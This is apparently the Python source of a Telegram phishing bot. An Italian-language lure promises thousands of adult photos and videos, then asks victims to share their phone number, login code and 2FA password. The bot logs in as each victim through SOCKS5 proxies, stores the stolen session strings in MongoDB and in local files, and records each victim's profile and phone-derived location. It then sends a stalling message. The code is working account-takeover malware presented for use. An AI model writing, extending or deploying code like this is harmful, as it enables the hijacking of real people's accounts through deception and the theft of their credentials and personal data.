import logging
import os
import json
import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
from datetime import datetime

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# Основная прокси (старая, для совместимости)
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
main_proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# Вторая прокси (новая)
PROXY1_HOST = os.getenv("PROXY1_HOST")
PROXY1_PORT = int(os.getenv("PROXY1_PORT"))
PROXY1_USER = os.getenv("PROXY1_USER")
PROXY1_PASS = os.getenv("PROXY1_PASS")
second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)

# Список доступных прокси (первая - старая основная)
proxy_list = [main_proxy, second_proxy]

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
start_col = db["start"]  # Коллекция для логирования всех действий

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

os.makedirs("sessions", exist_ok=True)

def get_proxy_for_phone(phone):
    """Выбираем прокси для номера"""
    existing_session = sessions_col.find_one({"phone": phone})
    if existing_session:
        return proxy_list[existing_session.get('proxy_index', 0)]
    return proxy_list[hash(phone) % len(proxy_list)]

def update_user_log(user_id: int, updates: dict):
    """Обновляет или создает запись пользователя с новыми данными"""
    try:
        start_col.update_one(
            {"user_id": user_id},
            {"$set": updates, "$setOnInsert": {"first_seen": datetime.now()}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"Ошибка при обновлении лога пользователя: {e}")

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user = message.from_user
    
    # Обновляем информацию о пользователе
    update_user_log(
        user_id=user.id,
        updates={
            "username": user.username,
            "first_name": user.first_name,
            "last_name": user.last_name,
            "language_code": user.language_code,
            "is_bot": user.is_bot,
            "chat_id": message.chat.id,
            "last_start": datetime.now(),
            "status": "started"
        }
    )

    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("Autorizzazione del primo account🥰", callback_data="auth_account")
    )
    await message.answer(
        "👋🇮🇹 CIAO! ❤️\n"
        "Vuoi vedere più di 10.000 foto e più di 4.000 video? 👀\n"
        "Verifica di non essere un bot con il pulsante qui sotto. 🤖👇\n\n",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    # Обновляем статус пользователя
    update_user_log(
        user_id=user_id,
        updates={
            "auth_button_clicked": True,
            "auth_button_click_time": datetime.now(),
            "status": "awaiting_contact"
        }
    )

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Condividi il tuo numero", request_contact=True))

    await bot.send_message(user_id, "🥰 Per favore condividi il tuo numero di telefono:", reply_markup=kb)
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    # Получаем информацию о геолокации по номеру телефона
    geo_info = None
    try:
        parsed_number = phonenumbers.parse(phone)
        geo_info = geocoder.description_for_number(parsed_number, "en")
    except Exception as e:
        logging.error(f"Ошибка при определении геолокации: {e}")

    # Обновляем информацию о контакте
    update_user_log(
        user_id=user_id,
        updates={
            "phone": phone,
            "geo_info": geo_info,
            "contact_shared": True,
            "contact_share_time": datetime.now(),
            "contact_user_id": message.contact.user_id,
            "status": "contact_received"
        }
    )

    # Выбираем прокси для этого номера
    selected_proxy = get_proxy_for_phone(phone)
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        await message.answer("⌨️ Inserisci il codice premendo i pulsanti qui sotto:")
    except Exception as e:
        await message.answer(f"❌ Errore nell'invio del codice: {e}")
        await client.disconnect()
        cleanup(user_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.send_message(user_id, "⚠️ Sessione non trovata. Riprova con /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            me = await client.get_me()
            session_str = client.session.save()
            
            # Определяем индекс прокси для сохранения
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name if me.last_name else None,
                    "auth_date": datetime.now()
                }}, 
                upsert=True
            )

            # Обновляем информацию об успешной авторизации
            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "telegram_id": me.id,
                    "tg_username": me.username,
                    "tg_first_name": me.first_name,
                    "tg_last_name": me.last_name,
                    "status": "authenticated",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await bot.send_message(user_id, "Stiamo lavorando in modalità manuale, scusate il ritardo, presto vi invieremo materiale fotografico e video😉🧍‍♀️.")
            await client.disconnect()
            cleanup(user_id)
        else:
            user_states[user_id] = 'awaiting_2fa'
            update_user_log(
                user_id=user_id,
                updates={"status": "awaiting_2fa"}
            )
            await bot.send_message(user_id, "🔐 Inserisci la tua password 2FA:")
    except PhoneCodeExpiredError:
        await bot.send_message(user_id, "⏰ Codice scaduto. Riprova da /start")
        await client.disconnect()
        cleanup(user_id)
    except PhoneCodeInvalidError:
        await bot.send_message(user_id, "❌ Codice errato. Riprova:")
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        update_user_log(
            user_id=user_id,
            updates={"status": "awaiting_2fa"}
        )
        await bot.send_message(user_id, "🔐 È richiesta la tua password 2FA. Inseriscila:")
    except Exception as e:
        await bot.send_message(user_id, f"❌ Errore di accesso: {e}")
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("⚠️ Sessione non trovata. Riprova da /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "auth_date": datetime.now(),
                    "has_2fa": True
                }}, 
                upsert=True
            )
            
            # Обновляем информацию об успешной авторизации с 2FA
            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "has_2fa": True,
                    "status": "authenticated_with_2fa",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await message.answer("Stiamo lavorando in modalità manuale, scusate il ritardo, presto vi invieremo materiale fotografico e video😉🧍‍♀️.")
            await client.disconnect()
            cleanup(user_id)
        else:
            await message.answer("❌ Impossibile accedere con 2FA.")
    except Exception as e:
        await message.answer(f"❌ Errore con 2FA: {e}")
        await client.disconnect()
        cleanup(user_id)

# ... (остальные функции остаются без изменений)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)